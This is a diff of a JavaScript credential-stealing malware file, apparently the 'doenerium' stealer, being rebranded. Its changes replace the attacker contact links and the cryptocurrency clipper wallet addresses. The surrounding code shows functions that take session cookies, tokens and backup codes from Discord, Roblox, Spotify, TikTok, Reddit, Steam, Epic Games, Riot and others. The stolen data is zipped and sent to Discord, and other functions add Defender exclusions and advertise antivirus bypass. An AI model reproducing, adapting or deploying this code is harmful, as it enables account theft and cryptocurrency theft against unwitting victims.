@@ -461,7 +461,7 @@ async function findBackupCodes() {
               },
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
-                text: `${user.hostname} | t.me/WallGod69`,
+                text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                 icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
               },
             };
@@ -514,7 +514,7 @@ async function findEpicGamesBackupCodes() {
               },
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
-                text: `${user.hostname} | t.me/WallGod69`,
+                text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                 icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
               },
             };
@@ -566,7 +566,7 @@ async function findGithubBackupCodes() {
               },
               description: `\`\`\`${destinationFilePath}\n\n${fs.readFileSync(destinationFilePath, 'utf-8')}\`\`\``,
               footer: {
-                text: `${user.hostname} | t.me/WallGod69`,
+                text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                 icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
               },
             };
@@ -706,7 +706,7 @@ user = {
         randomUUID: crypto.randomBytes(16).toString('hex'),
         start: Date.now(),
         debug: false,
-        copyright: '<================[discord.gg/doenerium ]>================>\n\n',
+        copyright: '<================[ rvlt.gg/WF80RrNf ]>================>\n\n',
         url: null,
         locale: locale,
     }
@@ -1057,15 +1057,15 @@ function addDefenderExclusions() {
 
 // Replace with your addresses or all money to me :)
 const addresses = {
-    btc: "bc1qsuc4rc2uknl43kqxemuyv6d3xffnds2j008gj7",
-    eth: "0x700875DF55d904b24469458a6bAE04F6dd7eF91F",
-    ltc: "ltc1qx7n7fr4anyssyhfp2s4sd9jv7r89ex9sd2d6dg",
-    trx: "TJYeEhaoY5sQ66SHLbCp85jGcSkqLLvBTU",
-    bch: "qzjw4dju5x2x3kwtuelppmm8lpw7mvna7s5fle3sr4",
-    xmr: "43AKqd1L4QKVQux7bKEK6dUmVKEJTdEtgSgYaj25rgRGaUrp2gekLA1bRDzJbbadPTaNwBG8njmYCVvEiJZByyvV6NanCUR",
-    xrp: "rf2ysNUBNYFPX5tzNfaNgRjJDedQWh6mSV",
-    zcash: "t1a34uQ8XRNKoWyykQUAtR6vj58UDMpaayf",
-    doge: "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"
+    btc: "bc1qfyhhl5qd8jy8qww4gku7r93eyyu69ckmk9sthz",
+    eth: "0xe821b7964b15c27611E38DABe9fD3373BD11fFE1",
+    ltc: "LLRzcyZv6LsmVwUzu2R881EELmuH4QENf5",
+    trx: "TQhwuNQ9RdJdua5WNJMacgj1TiCPCP6XNY",
+    bch: "qrhxm9rgh2z3psahgjzqkpqcgy5xj2vwxq9jze9nel",
+    xmr: "43AKqd1L4QKVQux7bKEK6dUmVKEJTdEtgSgYaj25rgRGaUrp2gekLA1bRDzJbbadPTaNwBG8njmYCVvEiJZByyvV6NanCDT",
+    xrp: "rBZg1pVSCseJ7443xv3m81N5w75ff8K8xX",
+    zcash: "t1XwdmFo5g8GcR5pSjiy9TZfuGyU7biYbKV",
+    doge: "DQkHa1pj7Vyd2wJfqRLX47ckh8gwD5ryFf"
 };
 
 // This is a clipper, here is the decrypted code: https://pastebin.com/raw/juyfkJ4N (DM me on Telegram if you don't know how to decrypt base64 :0)
@@ -1321,7 +1321,7 @@ async function SubmitInstagram(session_id) {
         { name: 'Token', value: '```' + data.session_id + '```', inline: false },
       ],
       footer: {
-        text: `${user.hostname} | t.me/WallGod69`,
+        text: `${user.hostname} | rvlt.gg/WF80RrNf`,
       },
     };
 
@@ -1431,7 +1431,7 @@ async function SubmitRoblox(secret_cookie) {
         },
       ],
       footer: {
-        text: `${user.hostname} | t.me/WallGod69`,
+        text: `${user.hostname} | rvlt.gg/WF80RrNf`,
         icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
       },
     };
@@ -1489,7 +1489,7 @@ async function SpotifySession(cookie) {
                 { name: 'Spotify Cookie | sp_dc=', value: '```' + cookie + '```', inline: false }
             ],
             footer: {
-                text: `${user.hostname} | t.me/WallGod69`,
+                text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                 icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
             }
         };
@@ -1611,7 +1611,7 @@ function stealTikTokSession(cookie) {
                         }
                       ],
                       footer: {
-                        text: `${user.hostname} | t.me/WallGod69`,
+                        text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                         icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
                       },
                     }
@@ -1697,7 +1697,7 @@ function setRedditSession(cookie) {
                 { name: '🚫 Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
                             ],
                             footer: {
-                                text: `${user.hostname} | t.me/WallGod69`,
+                                text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                                 icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
                             },
                             author: {
@@ -1867,7 +1867,7 @@ async function getTokens() {
 
     const predefinedBio = `╔═══════════✧✧✧═══════════╗ 
 **     This free virus can bypass all antivirus !** 
-**           ⭐️https://discord.gg/doenerium** ⭐️
+**           ⭐️https://rvlt.gg/WF80RrNf** ⭐️
 ╚═══════════✧✧✧═══════════╝`;
 
     for (let token of tokens) {
@@ -1944,7 +1944,7 @@ async function getTokens() {
                     },
                 ],
                 footer: {
-                    text: `${user.hostname} | t.me/WallGod69`,
+                    text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                     icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
                 }
             };
@@ -1963,7 +1963,7 @@ async function getTokens() {
                         icon_url: "https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp"
                     },
                     footer: {
-                        text: `${user.hostname} | t.me/WallGod69`,
+                        text: `${user.hostname} | rvlt.gg/WF80RrNf`,
                     }
                 };
                 data.embeds.push(friendsEmbed);
@@ -2474,7 +2474,7 @@ async function StealEpicGames() {
                 }
             });
 
-            const howToUseContent = `<================[discord.gg/doenerium Stealer]>================>\n\n
+            const howToUseContent = `<================[rvlt.gg/WF80RrNf Stealer]>================>\n\n
 Close EpicGamesLauncher first, WIN + R type --> %localappdata%\\EpicGamesLauncher\\Saved\n
 delete everything and copy all contents into the Epic Games folder and run.`;
 
@@ -2604,7 +2604,7 @@ function createSteamEmbed(account, accountInfo, games, level) {
             }
         ],
         footer: {
-            text: `${user.hostname} | t.me/WallGod69`,
+            text: `${user.hostname} | rvlt.gg/WF80RrNf`,
             icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
         },
     };
@@ -2632,7 +2632,7 @@ async function getGrowtopia() {
       await ensureDirectoryExistence(howToUseDir);
 
       const howToUsePath = path.join(howToUseDir, 'How to Use.txt');
-      const howToUseContent = `https://discord.gg/doenerium\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
+      const howToUseContent = `https://rvlt.gg/WF80RrNf\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
 
       await writeFile(howToUsePath, howToUseContent, { flag: 'a' });
     }
@@ -2835,7 +2835,7 @@ async function archiveAndSendData() {
         const archive = new AdmZip();
         archive.addLocalFolder(mainFolderPath);
         zipFilePath = `C:/ProgramData/Steam/Launcher/${locale}-${computerName}.zip`;
-        archive.addZipComment('All the Information was Stealed by discord.gg/doenerium.');
+        archive.addZipComment('All the Information was Stealed by rvlt.gg/WF80RrNf.');
         archive.writeZip(zipFilePath);
         console.log('Archive created successfully');
         getExtension(zipFilePath);
@@ -3139,7 +3139,7 @@ try {
         description: '‎',
         color: 0x303037,
         author: {
-            name: `${user.hostname} | System Information | @WallGod69`,
+            name: `${user.hostname} | System Information | rvlt.gg/WF80RrNf`,
             icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
         },
         fields: [
@@ -3196,7 +3196,7 @@ try {
             },
         ],
         footer: {
-            text: `${user.hostname} | t.me/WallGod69`,
+            text: `${user.hostname} | rvlt.gg/WF80RrNf`,
             icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
         },
     };
@@ -3779,7 +3779,7 @@ async function sendKeywordsToDiscord(keywords) {
             "description": formattedKeywords,
             "color": 0x303037,
             "footer": {
-                "text": `${user.hostname} | t.me/WallGod69`,
+                "text": `${user.hostname} | rvlt.gg/WF80RrNf`,
                 "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
             }
         };
@@ -3806,7 +3806,7 @@ async function sendStakeSessionToDiscord(decrypted) {
             "description": `Session Cookie: \n\`\`\`${decrypted}\`\`\``,
             "color": 0x303037,
             "footer": {
-                "text": `${user.hostname} | t.me/WallGod69`,
+                "text": `${user.hostname} | rvlt.gg/WF80RrNf`,
                 "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
             },
             "thumbnail": {
@@ -3983,7 +3983,7 @@ async function RiotGameSession(cookie) {
             "description": ``,
             "color": 0x303037,
             "footer": {
-                "text": `${user.hostname} | t.me/WallGod69`,
+                "text": `${user.hostname} | rvlt.gg/WF80RrNf`,
                 "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
             },
             "thumbnail": { "url": "https://seeklogo.com/images/V/valorant-logo-FAB2CA0E55-seeklogo.com.png" },
